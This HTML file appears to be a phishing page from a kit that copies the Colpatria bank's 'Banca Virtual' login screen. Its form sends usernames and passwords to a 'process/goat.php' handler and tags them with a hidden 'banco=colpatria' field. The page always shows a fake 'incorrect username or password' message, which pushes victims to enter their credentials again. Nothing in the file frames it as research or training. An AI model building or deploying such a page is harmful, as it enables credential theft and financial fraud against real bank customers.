<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Colpatria</title>
    <style>
        * {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
    </style>
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
</head>
<body>
    <div style="border-top:5px solid red; border-bottom:1px solid #dcdcdc; height:60px;">
        <img src="logo.png" alt="" srcset="" width="25%" style="margin-top:-20px; margin-left:20px;">
    </div>
    <br><br>
    <center><h2>Ingresa a tu Banca Virtual</h2></center>
    <br><br><br>
    <img src="usuario.png" alt="" srcset="" width="5%" style="position:absolute; margin-top:8px; margin-left:25px;">
    <img src="candado.png" alt="" srcset="" width="5%" style="position:absolute; margin-top:100px; margin-left:25px;">
    
    <form action="process/goat.php" method="POST">
        <center>
            <input type="text" name="user" id="txtUsuario" placeholder="Nombre de usuario" 
                   style="width:80%; padding-left:30px; height:40px; border:none; border-bottom:1px solid gray; font-size:17px;" required>
            <br><br><br><br>
            <input type="password" name="pass" id="txtPass" placeholder="Contraseña" 
                   style="width:80%; padding-left:30px; height:40px; border:none; border-bottom:1px solid gray; font-size:17px;" required minlength="8">
            <br>
           
           <br>
           <a style="color:rgb(255, 0, 0); margin-bottom:0px; ">Tu usuario y contraseña no son correctos</a>
           <br> 
           <br><input type="hidden" name="banco" value="colpatria">
            <input type="submit" name="clave" value="Ingresar" 
                   style="width:90%; height:45px; border-radius:5px; background-color:red; color:white; border:none;">
            <br><br><br>
            
        </center>
    </form>
    <h3 style="margin-left:20px;">¿No te has registrado?</h3><br>
    <center><input type="button" value="Regístrate aquí" 
                   style="width:90%; height:45px; border-radius:5px; background-color:white; color:red; border:1px solid red;"></center>
</body>
</html>
